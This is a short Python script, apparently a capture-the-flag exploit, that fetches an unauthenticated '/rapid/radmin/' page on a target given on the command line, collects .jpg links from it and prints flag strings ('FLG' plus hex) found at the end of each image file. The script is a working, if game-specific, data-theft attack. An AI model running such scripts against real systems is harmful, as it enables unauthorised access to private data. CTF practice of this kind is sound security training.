from urllib import response
import requests
import sys
import re
from io import BytesIO

def print_flags(raw_data):
    print("\n".join(re.findall("FLG[0-9a-f]{28}", raw_data)))

def exploit(target):
    # regex: href='(.[a-zA-Z\/1-9]*?.jpg)
    sess = requests.Session()     
    radmin_content = sess.get("http://%s/rapid/radmin/" % target).text

    print(radmin_content)
    list_of_images = re.findall(r"href='(.[a-zA-Z\/1-9]*?.jpg)", radmin_content)
    print(list_of_images)
    for img in list_of_images:
        r = requests.get("http://%s" % target + img).text
        print_flags(r[-31:])
    
if __name__ == '__main__':
    exploit(sys.argv[1])
